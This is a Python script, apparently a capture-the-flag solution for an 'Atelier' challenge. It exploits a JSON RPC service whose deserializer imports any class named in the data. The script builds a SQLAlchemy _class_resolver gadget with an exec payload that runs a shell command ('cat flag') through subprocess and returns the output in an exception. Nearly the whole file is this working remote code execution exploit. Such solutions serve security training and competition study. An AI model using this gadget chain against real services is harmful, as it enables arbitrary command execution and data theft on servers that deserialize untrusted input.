#!/usr/bin/env python3

import sys
import json
import asyncio
import importlib

# from sqlalchemy import *


class AtelierException:
    def __init__(self, e):
        self.message = repr(e)


class MaterialRequest:
    pass


class MaterialRequestReply:
    pass


class RecipeCreateRequest:
    def __init__(self, materials):
        self.materials = materials


class RecipeCreateReply:
    pass


def object_to_dict(c):
    res = {}
    res["__class__"] = str(c.__class__.__name__)
    res["__module__"] = str(c.__module__)
    res.update(c.__dict__)
    return res


def dict_to_object(d):
    if "__class__" in d:
        class_name = d.pop("__class__")
        module_name = d.pop("__module__")
        module = importlib.import_module(module_name)
        class_ = getattr(module, class_name)

        inst = class_.__new__(class_)
        inst.__dict__.update(d)
    else:
        inst = d

    return inst


async def rpc_client(message):
    # message = json.dumps(message, default=object_to_dict)

    reader, writer = await asyncio.open_connection(sys.argv[1], int(sys.argv[2]))
    writer.write(message.encode())
    data = await reader.read(2000)
    writer.close()

    res = json.loads(data, object_hook=dict_to_object)
    if isinstance(res, AtelierException):
        print("Exception: " + res.message)
        exit(1)

    return res


loop = asyncio.get_event_loop()

# found these classes by grepping sqlalchemy source code
# https://github.com/sqlalchemy/sqlalchemy/blob/rel_1_3_5/lib/sqlalchemy/ext/declarative/clsregistry.py#L292
from sqlalchemy.ext.declarative.clsregistry import _class_resolver

# https://github.com/sqlalchemy/sqlalchemy/blob/rel_1_3_5/lib/sqlalchemy/sql/functions.py#L486
# we need it to use split(","), to strip the argument
from sqlalchemy.sql.functions import _FunctionGenerator

target = _class_resolver.__new__(_class_resolver)
target.arg = """exec('import subprocess; raise Exception(subprocess.check_output("cat flag", shell=True))')"""
target._dict = {}

obj = RecipeCreateRequest.__new__(RecipeCreateRequest)
obj.materials = RecipeCreateRequest.__new__(RecipeCreateRequest)
obj.materials.split = target
# obj.materials.split = _FunctionGenerator.__new__(_FunctionGenerator)
# obj.materials.split.opts = RecipeCreateRequest.__new__(RecipeCreateRequest)
# obj.materials.split.opts.copy = target
serialized = json.dumps(obj, default=object_to_dict, indent=4)
print(serialized)
res = loop.run_until_complete(rpc_client(serialized))

print(res)